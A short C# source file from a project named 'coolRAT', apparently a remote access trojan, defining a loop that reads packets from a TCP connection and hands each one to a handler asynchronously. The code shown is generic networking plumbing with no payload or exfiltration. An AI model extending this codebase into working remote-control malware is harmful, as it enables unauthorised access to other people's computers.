using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.PacketProcessors;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Libs
{
    public class PacketListenerLoop
    {
        public TcpConnection Connection;
        public PacketHandler Handler;
        public bool AbortLoop;

        public PacketListenerLoop(TcpConnection connection, PacketHandler handler)
        {
            Connection = connection;
            Handler = handler;
            AbortLoop = false;
        }

        public void Run()
        {
            while(!AbortLoop)
            {
                string packet_raw = Connection.ReadPacket();
                Task.Run(() => Handler.HandlePacket(packet_raw));
            }
        }

        public static PacketListenerLoop Spawn(TcpConnection conn, PacketHandler handler)
        {
            PacketListenerLoop packetListenerLoop = new PacketListenerLoop(conn, handler);
            Task.Run(() => packetListenerLoop.Run());
            return packetListenerLoop;
        }
    }
}
